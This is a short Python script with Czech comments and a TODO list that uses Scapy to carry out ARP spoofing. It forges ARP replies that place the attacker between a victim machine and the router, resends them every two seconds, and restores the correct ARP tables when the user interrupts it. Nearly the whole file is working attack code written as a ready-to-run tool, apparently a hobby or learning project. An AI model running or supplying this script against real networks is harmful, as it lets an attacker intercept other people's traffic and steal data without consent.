# spoofer_logic.py - TODO LIST

# 1. TODO: Importovat Scapy (ARP, send, wrpcap)

# 2. TODO: Funkce spoof(target_ip, spoof_ip, target_mac)
#    - Vytvořit falešný ARP paket typu "is-at".
#    - Nastavit psrc na IP routeru, ale odeslat ho na MAC oběti.

# 3. TODO: Funkce restore(target_ip, gateway_ip, target_mac, gateway_mac)
#    - Pošle správné ARP údaje oběti i routeru.
#    - Tím se síť "uzdraví", až vypnete program.

# 4. TODO: Funkce save_capture(packet_list, filename="capture.pcap")
#    - Použít wrpcap() k uložení nasbíraných dat.
from scapy.all import ARP, wrpcap, send as s
import time
from network_utils import target_ip, target_mac, router_ip, router_mac

# --- Config --- #

# Vytvoření falešného ARP paketu pro oběť
arp_obet = ARP(op=2, psrc=router_ip, pdst=target_ip, hwdst=target_mac)
arp_router = ARP(op=2, psrc=target_ip, pdst=router_ip, hwdst=router_mac)

# Restore tabulek
arp_obet_restore = ARP(op=2, psrc=router_ip, hwsrc=router_mac, pdst=target_ip, hwdst=target_mac)
arp_router_restore = ARP(op=2, psrc=target_ip, hwsrc=target_mac, pdst=router_ip, hwdst=router_mac)


# --- Hlavní funkce --- #
def spoof():
    # Odeslání ARP paketů
    try: 
        print(f"Posílám falešné ARP pakety: Ctrl+C pro ukončení.")
        while True:
            s(arp_obet, verbose=False)
            s(arp_router, verbose=False)
            time.sleep(2)

    except KeyboardInterrupt:
        print("Ukončuji útok, vracím síť do normálu...")
        # Odeslání správných ARP paketů pro obnovení sítě
        s(arp_obet_restore, verbose=False, count=5)
        s(arp_router_restore, verbose=False, count=5)

        print("Síť byla obnovena. Program ukončen.")


if __name__ == "__main__":
    spoof()